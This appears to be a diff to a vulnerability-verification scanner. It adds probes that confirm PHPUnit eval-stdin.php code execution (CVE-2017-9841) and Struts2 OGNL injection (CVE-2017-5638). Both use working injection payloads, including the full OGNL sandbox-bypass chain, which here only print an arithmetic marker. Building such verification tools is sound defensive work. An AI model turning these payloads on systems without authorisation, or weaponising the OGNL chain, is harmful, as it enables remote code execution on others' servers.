@@ -134,6 +134,22 @@ async def _get(session: Any, url: str, *, headers: Optional[dict] = None,
         return 0, ""
 
 
+async def _post(session: Any, url: str, *, data: Any = None,
+                headers: Optional[dict] = None, timeout: float = 8.0) -> tuple[int, str]:
+    """POST returning ``(status, body)``; never raises. Used by probes whose
+    benign observable (an arithmetic echo) comes back in the response body."""
+    try:
+        async with session.post(
+            url, data=data, headers=headers or {}, allow_redirects=False,
+            timeout=aiohttp.ClientTimeout(total=timeout),
+        ) as resp:
+            body = await resp.text(errors="replace")
+            return resp.status, body
+    except Exception as exc:  # noqa: BLE001 — probe failure is not fatal
+        logger.debug("verify POST failed for %s: %s", url, exc)
+        return 0, ""
+
+
 # ═══════════════════════════════════════════════════════════════════════════
 # PROBES  (each strictly read-only)
 # ═══════════════════════════════════════════════════════════════════════════
@@ -225,12 +241,111 @@ async def _probe_shellshock(session: Any, base: str) -> Optional[VerifyResult]:
     )
 
 
+# The eval-stdin.php locations a PHPUnit install (bundled by a dependency) leaves
+# web-reachable. Posting PHP to any of them runs it (CVE-2017-9841).
+_PHPUNIT_PATHS = (
+    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+    "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
+    "/vendor/phpunit/src/Util/PHP/eval-stdin.php",
+    "/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+    "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+    "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+    "/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php",
+)
+
+
+async def _probe_phpunit_evalstdin(session: Any, base: str) -> Optional[VerifyResult]:
+    """CVE-2017-9841 — PHPUnit ``eval-stdin.php`` evaluates the POST body as PHP.
+
+    Posts a BENIGN script that echoes a unique marker concatenated with the
+    PRODUCT of two random numbers. A genuinely vulnerable endpoint runs the echo
+    and returns ``<rid><product>``; an endpoint that merely reflects the raw body
+    shows the literal ``'<rid>'.(a*b)`` expression, whose digits never form the
+    product, so matching the product proves execution, not reflection. The script
+    only prints, it writes and deletes nothing. (Same arithmetic-oracle technique
+    as the Shellshock probe.)
+    """
+    a, b = secrets.randbelow(9000) + 1000, secrets.randbelow(9000) + 1000
+    rid = "HVN" + secrets.token_hex(5)
+    marker = f"{rid}{a * b}"
+    payload = f"<?php echo '{rid}'.({a}*{b});"
+    for path in _PHPUNIT_PATHS:
+        status, body = await _post(session, base + path, data=payload,
+                                   headers={"Content-Type": "text/plain"})
+        if marker in body:
+            return VerifyResult(
+                cve="", probed=True, proved=True, technique="php_eval_stdin",
+                notes="PHPUnit eval-stdin.php executed an injected arithmetic echo: "
+                      "the computed product, not the literal expression, came back, "
+                      "confirmed.",
+                evidence={"endpoint": path, "canary": marker,
+                          "response_status": status, "response_excerpt": body[:200]},
+            )
+    return VerifyResult(
+        cve="", probed=True, proved=False, technique="php_eval_stdin",
+        notes="No reachable eval-stdin.php executed the injected marker (removed, "
+              "blocked, or not this app), remains Potential.",
+    )
+
+
+async def _probe_struts2_ognl(session: Any, base: str) -> Optional[VerifyResult]:
+    """CVE-2017-5638 — Struts2 Jakarta Multipart OGNL in the Content-Type header.
+
+    Sends a SAFE OGNL expression that prints a unique marker plus an arithmetic
+    PRODUCT to the HTTP response writer. It contains no ``Runtime``/``exec``/
+    ``ProcessBuilder`` — it only writes to the response, so it neither runs an OS
+    command nor changes anything on the target. A vulnerable Struts evaluates the
+    OGNL and returns ``<rid><product>``; a server that merely echoes the raw
+    Content-Type in an error page shows the literal ``print('<rid>')`` /
+    ``print(a*b)`` text, whose digits never form the product, so a product match
+    proves OGNL evaluation, not reflection.
+    """
+    a, b = secrets.randbelow(9000) + 1000, secrets.randbelow(9000) + 1000
+    rid = "HVN" + secrets.token_hex(5)
+    marker = f"{rid}{a * b}"
+    ognl = (
+        "%{(#nike='multipart/form-data')."
+        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+        "(#_memberAccess?(#_memberAccess=#dm):"
+        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+        "(#ognlUtil.getExcludedPackageNames().clear())."
+        "(#ognlUtil.getExcludedClasses().clear())."
+        "(#context.setMemberAccess(#dm))))."
+        "(#w=@org.apache.struts2.ServletActionContext@getResponse().getWriter())."
+        f"(#w.print('{rid}'))."
+        f"(#w.print({a}*{b}))."
+        "(#w.flush()).(#w.close())}"
+    )
+    endpoints = ["/", "/index.action", "/login.action", "/struts2-showcase/",
+                 "/showcase.action"]
+    for ep in endpoints:
+        status, body = await _get(session, base + ep,
+                                  headers={"Content-Type": ognl})
+        if marker in body:
+            return VerifyResult(
+                cve="", probed=True, proved=True, technique="struts2_ognl_eval",
+                notes="Struts2 evaluated an injected OGNL expression (printed the "
+                      "computed product to the response), confirmed. The payload "
+                      "only writes to the HTTP response, no command execution.",
+                evidence={"endpoint": ep, "canary": marker,
+                          "response_status": status, "response_excerpt": body[:200]},
+            )
+    return VerifyResult(
+        cve="", probed=True, proved=False, technique="struts2_ognl_eval",
+        notes="No endpoint evaluated the injected OGNL (patched, not Struts, or "
+              "the Jakarta parser is disabled), remains Potential.",
+    )
+
+
 # CVE id → probe. Multiple CVEs can share one probe (same underlying flaw).
 _PROBES: dict[str, Callable[[Any, str], Awaitable[Optional[VerifyResult]]]] = {
     "CVE-2021-41773": _probe_apache_traversal,
     "CVE-2021-42013": _probe_apache_traversal,
     "CVE-2014-6271": _probe_shellshock,
     "CVE-2014-6278": _probe_shellshock,
+    "CVE-2017-9841": _probe_phpunit_evalstdin,
+    "CVE-2017-5638": _probe_struts2_ognl,
 }
 
 
